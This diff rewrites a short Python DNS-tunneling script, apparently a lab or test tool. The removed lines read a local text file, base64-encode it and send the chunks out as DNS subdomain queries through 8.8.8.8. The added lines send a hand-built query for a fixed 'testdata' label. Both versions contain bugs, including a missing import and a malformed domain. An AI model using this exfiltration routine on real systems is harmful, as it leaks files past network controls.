@@ -1,21 +1,29 @@
-from scapy.all import DNS, DNSQR, IP, sr1, UDP
-import os
+import socket
 
-url = "http://127.0.0.1/"
+def dns_tunneling_request(subdomain, dns_server="8.8.8.8"):
+    domain = f"{subdomain}.127.0.0.1/api/dnstunneling"  # Replace with your target domain
 
-def dns_request(sub_domain):
-    dns_req = IP(dst='8.8.8.8')/UDP(dport=5000)/DNS(rd=1, qd=DNSQR(qname=f'{sub_domain}.{url}'))
-    answer = sr1(dns_req, verbose=0)
-    #return answer
+    # Build the DNS query
+    transaction_id = b"\xaa\xaa"  # Transaction ID
+    flags = b"\x01\x00"  # Standard query
+    questions = b"\x00\x01"  # One question
+    answer_rrs = b"\x00\x00"
+    authority_rrs = b"\x00\x00"
+    additional_rrs = b"\x00\x00"
+    
+    # Build the question section
+    qname = b"".join(bytes([len(label)]) + label.encode("utf-8") for label in domain.split("."))
+    qtype = b"\x00\x01"  # QTYPE A
+    qclass = b"\x00\x01"  # QCLASS IN
+    
+    # Full DNS packet
+    dns_query = transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs + qname + b"\x00" + qtype + qclass
 
-dir = os.getcwd()
+    # Send the DNS query
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.sendto(dns_query, (dns_server, 53))
+    response, _ = sock.recvfrom(1024)
 
-f = open(f"{dir}\\text.txt", "r")
-text = f.read()
-text_bytes = base64.b64encode(text.encode("ascii"))
-list = [text_bytes[i:i+8] for i in range(0, len(text_bytes), 8)]
-for item in list:
-    item = item.decode('utf-8')
-    if "=" in item:
-        item = item.replace("=", "")
-    dns_request(item)
+    print(f"Received DNS response: {response}")
+
+dns_tunneling_request("testdata")
